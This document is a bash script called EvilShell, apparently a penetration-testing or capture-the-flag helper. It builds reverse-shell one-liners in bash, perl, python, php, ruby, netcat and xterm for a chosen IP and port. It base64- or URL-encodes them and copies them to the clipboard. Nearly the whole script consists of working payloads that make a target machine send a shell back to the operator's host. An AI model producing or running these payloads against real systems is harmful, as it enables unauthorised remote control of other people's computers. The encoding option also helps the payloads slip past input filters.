#!/bin/bash

########################################################################
#  ___________       .__ .__     _________.__             .__   .__    #
#  \_   _____/___  __|__||  |   /   _____/|  |__    ____  |  |  |  |   #
#   |    __)_ \  \/ /|  ||  |   \_____  \ |  |  \ _/ __ \ |  |  |  |   #
#   |        \ \   / |  ||  |__ /        \|   Y  \\  ___/ |  |__|  |__ #
#  /_______  /  \_/  |__||____//_______  /|___|  / \___  >|____/|____/ #
#          \/                          \/      \/      \/              #
########################################################################
###	                     @whitexnd                               ###
###	    	https://github.com/whitexnd?tab=repositories         ###
########################################################################


green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

function banner(){
		echo "
___________       .__ .__     _________.__             .__   .__   
\_   _____/___  __|__||  |   /   _____/|  |__    ____  |  |  |  |  
 |    __)_ \  \/ /|  ||  |   \_____  \ |  |  \ _/ __ \ |  |  |  |  
 |        \ \   / |  ||  |__ /        \|   Y  \\\  ___/ |  |__|  |__   Made by WhiteXnd
/_______  /  \_/  |__||____//_______  /|___|  / \___  >|____/|____/
        \/                          \/      \/      \/
" | lolcat -S '80'
}

function tools() {
  # Define the list of tools to check for.
  tools=(xclip lolcat ifconfig urlencode)

  # Define the mapping from tools to package names.
  declare -A tool_packages=(
    ["ifconfig"]="net-tools"
    ["urlencode"]="gridsite-clients"
  )

  # Iterate over the list of tools.
  for tool in ${tools[@]}; do
    # Check if the tool is already installed.
    if ! which $tool > /dev/null; then
      # If not found determine the corresponding package name.
      package_name=${tool_packages[$tool]:-$tool}

      # Install the package using dpkg.
      echo -e "$yellow[!]$end Missing $tool package: $package_name"
      sudo apt install $package_name -y > /dev/null 2>&1

      # Check if the installation was successful.
      if which $tool > /dev/null; then
        echo -e "$purple[*]$end Package: $package_name installed successfully"; sleep 2.3
      else
        echo -e "$yellow[!]$end Instalation for $package_name failed, try to install it manually using: "
        echo -e "\tsudo apt install $red$package_name$end"
        exit 1
      fi
    fi
  done
}

# Encodes $1 (shell)
function encode() {
  case "$1" in
    b64) echo "$2" | base64 -w 0;;
    url) urlencode -m "$2";;
  esac
}

function copy() {
  # Encode the shell if $encode has value
  local shell
  if [ -n "$encode" ];then
    shell=$(encode "$encode" "$1")
  else
    shell="$1"
  fi

  # Print the result and copy it into the clipboard
  echo -e "$yellow[!]$end Shell copied on clipboard:\n$purple$shell$end"
  echo -n "$shell" | xclip -sel clip

  # Shows more info if -v was specified  
  if [ $# -eq 2 ] && [ "$verbose" ]; then
    echo -e "\n$turquoise$2$end"
  fi
}


function bash(){
	description="[?] Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10)"
	copy "bash -i >& /dev/tcp/$IP/$port 0>&1" "$description"
}

function perl(){
	description="[?] Here’s a shorter, feature-free version of the perl-reverse-shell"
	copy "perl -e 'use Socket;\$i=\"$IP\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" "$description"
}

function python(){
	description="[?] This was tested under Linux / Python 2.7"
	copy "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" "$description"
}

function php(){
	description="[?] This code assumes that the TCP connection uses file descriptor 3. If it doesn’t work, try 4, 5, 6…"
	copy "php -r '\$sock=fsockopen(\"$IP\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" "$description"
}

function ruby(){
	copy "ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
}

function nc(){
	description="[?] Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option"
	copy "nc -e /bin/sh $IP $port" "$description"
}

function nc2(){
	description="[?] If you have the wrong version of netcat installed, you might still be able to get your reverse shell back like this"
	copy "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $port >/tmp/f" "$description"
}

function xterm(){
	description="[?] One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you ($ip) on TCP port 6001."
	copy "xterm -display $IP:1"
	echo -e "$blue[*]$end To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):"
	echo -e "\n\t Xnest :1"
	echo -e "\n$blue[*]$end You’ll need to authorise the target to connect to you (command also run on your host):"
	echo -e "\n\t xhost $red<targetip>$end"
}

function help(){
	banner
	echo -e "$blue[*]$end By default takes the ip from tun0 if its founded and the 443 port"
	echo -e "$yellow[!]$end Current encoders:$purple b64 url$end"
	echo -e "$yellow[!]$end You can specify:$yellow Ip ->$end $purple-i <ip>$end |$yellow Port ->$end $purple-p <port>$end |$yellow Shell ->$end $purple-s <shell>$end"
	echo -e "\t\t    $yellow Verbose ->$end $purple-v$end |$yellow Encoder ->$end$purple -e <encoder>$end |$yellow Help ->$end$purple -h$end"
 	echo -e "\n\t$purple[+]$end Example: $purple$0 -i 10.10.0.123 -p 443 -s bash$end"
 	echo -e "\t$purple[+]$end Example: $purple$0 -s python -e b64$end"
	exit 0
}

function choose(){
        case $s in
                [0]* | [Bb]ash) bash;exit;;
                [1]* | [Pp]erl) perl;exit;;
                [2]* | [Pp]ython) python;exit;;
                [3]* | [Pp]hp) php;exit;;
		[4]* | [Rr]uby) ruby;exit;;
		[5]* | [Nn]c | [Nn]etcat) nc;exit;;
		[6]* | [Nn]c2 | [Nn]etcat2) nc2;exit;;
		[7]* | [Xx]term) xterm;exit;;
                [\!]* ) echo -e "$yellow[!]$end Exiting ...";exit;;
        esac
}

function selection(){
	shells=(bash perl python php ruby nc 'Wrong Nc (Netcat2)' xterm)
        echo -e "$blue[*]$end Select your Shell:\n"
        for i in  ${!shells[@]};do
                echo -e "\t$i -> $purple${shells[i]}$end"
        done
        echo -e "\t$yellow!) Exit$end\n"
	echo -en "$purple[+]$end Input: "
	read s
}

function checks(){
	# Check that everything is installed
	tools

	# Print help menu
	if [[ -z "$IP" ]];then
		help
	fi
}


function getip(){
	ifconfig=$(which ifconfig)
	ip_regex="inet ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})"
        	if [ "$($ifconfig tun0)" ];then
			IP=$($ifconfig tun0 | grep -Eo "$ip_regex" | awk '{print $2}')
		fi
}

####### Variables
port=443
getip


####### MAIN EXECUTION ######
while getopts i:p:s:e:hv opt; do
        case $opt in
		v) verbose="1";;
                i) IP=$OPTARG ;;
                p) port=$OPTARG ;;
		s) s=$OPTARG ;;
		e) encode=$OPTARG;;
		h) help ;;
        esac
done

# Some cheks
checks

# Banner
banner

# Checks if a shell was specified if not prints a menu
if [[ -z "$s" ]]; then
	selection
fi

# Select the shell that you want
choose
